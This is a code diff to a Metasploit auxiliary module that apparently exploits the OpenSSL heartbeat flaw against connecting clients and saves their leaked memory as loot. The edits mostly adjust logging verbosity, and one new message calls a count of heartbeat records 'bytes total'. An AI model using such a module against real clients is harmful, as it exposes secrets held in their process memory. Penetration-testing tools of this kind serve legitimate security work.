@@ -209,7 +209,7 @@ class Metasploit3 < Msf::Auxiliary
     end
 
     message_code = buff[0,1].to_s.unpack("C").first
-    print_status("#{@state[c][:name]} Message #{sprintf("type %.2x v%.4x %.2x", message_type, message_version, message_code)}")
+    vprint_status("#{@state[c][:name]} Message #{sprintf("type %.2x v%.4x %.2x", message_type, message_version, message_code)}")
 
     if message_type == 0x16
       print_status("#{@state[c][:name]} Processing Client Finished...")
@@ -222,12 +222,13 @@ class Metasploit3 < Msf::Auxiliary
 
     # Process heartbeat replies
     if message_type == 0x18
-      print_status("#{@state[c][:name]} Encrypted heartbeat received (#{buff.length} bytes) [#{@state[c][:heartbeats].length} total]")
+      vprint_status("#{@state[c][:name]} Encrypted heartbeat received (#{buff.length} bytes) [#{@state[c][:heartbeats].length} bytes total]")
       @state[c][:heartbeats] << buff
     end
 
     # Full up on heartbeats, disconnect the client
     if @state[c][:heartbeats].length >= heartbeat_limit
+      print_status("#{@state[c][:name]} Encrypted heartbeats received [#{@state[c][:heartbeats].length} bytes total]")
       store_captured_heartbeats(c)
       c.close()
     end
@@ -238,7 +239,7 @@ class Metasploit3 < Msf::Auxiliary
     if @state[c][:heartbeats].length > 0
       begin
         path = store_loot("openssl_memory_dump", "octet/stream", c.peerhost, @state[c][:heartbeats], "openssl_client_memory_dump.bin", "OpenSSL Heartbeat Client Memory Dump")
-        print_status("#{@state[c][:name]} Heartbeat stored in #{path}")
+        print_status("#{@state[c][:name]} Heartbeat data stored in #{path}")
       rescue ::Interrupt
         raise $!
       rescue ::Exception
